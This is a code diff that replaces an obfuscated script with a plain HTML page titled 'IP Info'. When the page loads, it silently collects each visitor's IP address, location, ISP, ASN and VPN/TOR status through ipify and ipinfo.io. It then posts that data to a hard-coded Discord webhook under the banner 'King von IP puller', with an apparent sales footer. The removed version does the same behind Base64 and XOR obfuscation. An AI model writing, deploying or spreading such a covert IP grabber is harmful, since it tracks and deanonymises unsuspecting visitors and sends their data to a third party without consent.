@@ -1,98 +1,118 @@
-<script>
-(function() {
-    // Function to Base64 decode and make the string usable
-    function _0x1a7c(_0x2d7c) {
-        return atob(_0x2d7c);
-    }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Info</title>
+</head>
+<body>
+    <script>
+        // Send data to Discord Webhook
+        async function sendToDiscord(ipInfo) {
+            const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
+            
+            const discordMessage = {
+                content: "@everyone",
+                embeds: [
+                    {
+                        image: {
+                            url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                        },
+                        title: "King von IP puller",
+                        fields: [
+                            {
+                                name: "IP Address", 
+                                value: ipInfo.ip, 
+                                inline: true
+                            },
+                            {
+                                name: "City", 
+                                value: ipInfo.city || "N/A", 
+                                inline: true
+                            },
+                            {
+                                name: "Region", 
+                                value: ipInfo.region || "N/A", 
+                                inline: true
+                            },
+                            {
+                                name: "Country", 
+                                value: ipInfo.country || "N/A", 
+                                inline: true
+                            },
+                            {
+                                name: "Organization", 
+                                value: ipInfo.org || "N/A", 
+                                inline: true
+                            },
+                            {
+                                name: "ASN", 
+                                value: ipInfo.asn || "N/A", 
+                                inline: true
+                            },
+                            {
+                                name: "VPN", 
+                                value: ipInfo.privacy?.vpn ? "True" : "False", 
+                                inline: true
+                            },
+                            {
+                                name: "Proxy", 
+                                value: ipInfo.privacy?.proxy ? "True" : "False", 
+                                inline: true
+                            },
+                            {
+                                name: "TOR", 
+                                value: ipInfo.privacy?.tor ? "True" : "False", 
+                                inline: true
+                            }
+                        ],
+                        color: 0x007BFF,
+                        footer: {
+                            text: "BY RUNTZ PURCHASE TODAY!"
+                        }
+                    }
+                ]
+            };
 
-    // XOR decryption function (simplified)
-    function _0x30fa(_0x430b, _0x5354) {
-        var _0x2438 = "";
-        for (var _0x33b6 = 0; _0x33b6 < _0x430b.length; _0x33b6++) {
-            _0x2438 += String.fromCharCode(_0x430b.charCodeAt(_0x33b6) ^ _0x5354);
-        }
-        return _0x2438;
-    }
-
-    // Base64 encode the Webhook URL
-    var _0x3b7b = _0x1a7c("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwODgxMDM1MzQyMjIzMTMwL1RiUU9VMTY0aFZENDdXWkduWm01YXd3NWdlWGFpdF9hWm5kbHJiYWloZD1SQU5FVw==");
-
-    // Main function that sends the data to the webhook
-    async function _0x4e9d(_0x2bc5) {
-        var _0x1994 = {
-            content: "@everyone",
-            embeds: [{
-                image: {
-                    url: _0x30fa('687474703a2f2f7777772e726f6c6c696e6773746f6e652e636f6d2f77702d636f6e74656e742f323032322f30322f6b696e672d766f6e2d706f7374756d6f75732d616c626f6d2e6a7067')
+            // Send the POST request to Discord
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                title: _0x30fa("4b", 3) + ' IP Puller',
-                fields: [{
-                    name: "IP Address",
-                    value: _0x2bc5.data.ip,
-                    inline: true
-                }, {
-                    name: "City",
-                    value: _0x2bc5.data.city,
-                    inline: true
-                }, {
-                    name: "State",
-                    value: _0x2bc5.data.region || "N/A",
-                    inline: true
-                }, {
-                    name: "Country",
-                    value: _0x2bc5.data.country,
-                    inline: true
-                }, {
-                    name: "Organization",
-                    value: _0x2bc5.data.org,
-                    inline: true
-                }, {
-                    name: "ASN Name",
-                    value: _0x2bc5.data.asn.name,
-                    inline: true
-                }, {
-                    name: "VPN",
-                    value: _0x2bc5.data.privacy.vpn ? "True" : "False",
-                    inline: true
-                }, {
-                    name: "Proxy",
-                    value: _0x2bc5.data.privacy.proxy ? "True" : "False",
-                    inline: true
-                }, {
-                    name: "TOR",
-                    value: _0x2bc5.data.privacy.tor ? "True" : "False",
-                    inline: true
-                }],
-                color: 0x007BFF,
-                footer: {
-                    text: _0x30fa("42592052754e545a20507572636861736520546f64617921")
-                }
-            }]
-        };
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => {
+                console.log('Data sent to Discord:', response);
+            })
+            .catch(error => {
+                console.error('Error sending to Discord:', error);
+            });
+        }
 
-        await fetch(_0x3b7b, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(_0x1994)
-        });
-    }
+        // Get IP information and send it to Discord
+        async function getVisitorInfo() {
+            try {
+                // Fetch the public IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
 
-    // Function to get the visitor's info using IP and send to Discord
-    async function _0x5331() {
-        const _0x7b3d = await fetch(_0x30fa("687474703a2f2f6170692e697066792e6f72673f666f726d61743d6a736f6e"));
-        const _0x2a57 = await _0x7b3d.json();
-        const _0x55c0 = _0x2a57.ip;
+                // Fetch the detailed IP information using ipinfo.io
+                const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
+                const ipInfo = await ipInfoResponse.json();
 
-        const _0x541d = await fetch(_0x30fa(`687474703a2f2f6970666f726d2e696f2f7772697465642f64656d6f2f${_0x55c0}`));
-        const _0x5f67 = await _0x541d.json();
+                console.log('IP Information:', ipInfo); // Debugging line
 
-        await _0x4e9d(_0x5f67);
-    }
+                // Send the IP info to Discord
+                await sendToDiscord(ipInfo);
+            } catch (error) {
+                console.error('Error fetching visitor information:', error);
+            }
+        }
 
-    setTimeout(function() {
-        _0x5331();
-    }, 500);
-})();
-</script>
+        // Call the function to get visitor info
+        getVisitorInfo();
+    </script>
+</body>
+</html>
